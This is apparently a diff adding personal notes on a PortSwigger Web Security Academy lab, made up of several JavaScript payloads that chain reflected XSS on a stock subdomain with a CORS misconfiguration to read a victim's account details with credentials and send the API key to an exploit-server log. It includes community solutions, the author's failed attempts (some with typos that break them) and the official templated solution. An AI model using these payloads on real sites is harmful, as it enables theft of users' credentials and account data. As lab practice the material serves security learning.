@@ -1,0 +1,62 @@
+community solutions:
+<script>
+    document.location="http://stock.0a98005704412627c1c734ae007000c7.web-security-academy.net/?productId=<script>"
+    var xhr = new XMLHttpRequest();
+    var url = 'https://0a4900ef046746bcc1e66e39008200a7.web-security-academy.net';
+
+    xhr.onreadystatechange = function(){
+        if (xhr.readyState == XMLHttpRequest.DONE) {
+            fetch('https://exploit-0aa300e4036e4b1fc09e626901f30003.web-security-academy.net/exploit/log?key=' + xhr.responseText)
+        }
+    }
+
+
+    xhr.open('GET', url + 'accountDetailes', true)
+    xhr.withCredentials = true;
+    xhr.send(null);</script>&storeId=1"
+</script>
+
+make it a oneliner:
+<script>
+    document.location="https://stock.0ab5006204c338ccc0f7024d004a00d9.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();xhr.onreadystatechange = function(){if (xhr.readyState == XMLHttpRequest.DONE) {fetch('https://exploit-0aa300e4036e4b1fc09e626901f30003.web-security-academy.net/log?key=' %2b xhr.responseText)};};xhr.open('GET', 'https://0ab5006204c338ccc0f7024d004a00d9.web-security-academy.net/accountDetails', true);xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1"
+</script>
+
+
+
+lets try mysol as oneliner:
+<script>
+document.location="https://stock.0ab5006204c338ccc0f7024d004a00d9.web-security-academy.net/?productId=%3cscript>var req = new XMLHttpRequest();req.onload = function(){fetch('https://exploit-0a8e001d0460387ac0d5024c017300a5.web-security-academy.net/log?key='+%2b+this.responseText);};reg.open('GET','https://0ab5006204c338ccc0f7024d004a00d9.web-security-academy.net/accountDetails', true);req.withCredentials = true;req.send();%3c/script%3e&storeId=1"
+</script>
+
+
+mysol failed:
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://stock.0a6a002003794b5cc0df62bd006b005f.web-security-academy.net/?productId=%3c/h4%3e%3cscript%3ewindow.location.assign("https://0a6a002003794b5cc0df62bd006b005f.web-security-academy.net/accountDetails")%3c/script%3e&storeId=1',true);
+    req.withCredentials = true;
+    req.send(null);
+    
+    function reqListener() {
+    location='https://exploit-0aa300e4036e4b1fc09e626901f30003.web-security-academy.net/log?key='+this.responseText;
+    }
+    </script>
+
+
+
+
+
+
+port solution (didnt work?!)
+<script>
+    document.location="http://stock.0a98005704412627c1c734ae007000c7.web-security-academy.net/?productId=<script>var+req+=+new+XMLHttpRequest();req.onload+=+reqListener;req.open('get','https://0a4900ef046746bcc1e66e39008200a7.web-security-academy.net/accountDetails',true);req.withCredentials+=+true;req.send();function+reqListener()+{location='https://exploit-0a1800da04942614c1c634d9012000be.web-security-academy.net/exploit/log?key='%2bthis.responseText;};%3c/script>&storeId=1"
+</script>
+
+
+(original portswigger solution):
+<script>
+    document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
+<!-- 
+Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://stock.0a98005704412627c1c734ae007000c7.web-security-academy.net/?productId=%3c/h4%3e%3cscript%3ewindow.location.assign(%22https://0a98005704412627c1c734ae007000c7.web-security-academy.net/accountDetails%22)%3c/script%3e&storeId=1. (Reason: CORS header ‘Access-Control-Allow-Origin’ missing). -->
